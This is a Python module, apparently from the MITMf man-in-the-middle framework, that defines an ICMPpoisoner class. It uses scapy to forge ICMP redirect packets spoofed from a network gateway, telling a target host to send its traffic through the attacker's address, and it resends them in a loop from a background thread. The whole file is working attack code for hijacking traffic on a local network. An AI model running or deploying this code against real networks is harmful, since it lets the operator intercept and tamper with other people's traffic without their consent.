# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import threading

from time import sleep
from core.logger import logger
from scapy.all import IP, ICMP, UDP, sendp

formatter = logging.Formatter("%(asctime)s [ICMPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("ICMPpoisoner", formatter)

class ICMPpoisoner():

    def __init__(self, options):

        self.target        = options.target
        self.gateway       = options.gateway
        self.interface     = options.interface
        self.ip_address    = options.ip
        self.debug         = False
        self.send          = True
        self.icmp_interval = 2

    def build_icmp(self):
        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
              IP(src=self.target, dst=self.gateway)/UDP()

        return pkt

    def start(self):
        pkt = self.build_icmp()

        t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug,))
        t.setDaemon(True)
        t.start()

    def stop(self):
        self.send = False
        sleep(3)

    def send_icmps(self, pkt, interface, debug):
        while self.send:
            sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)
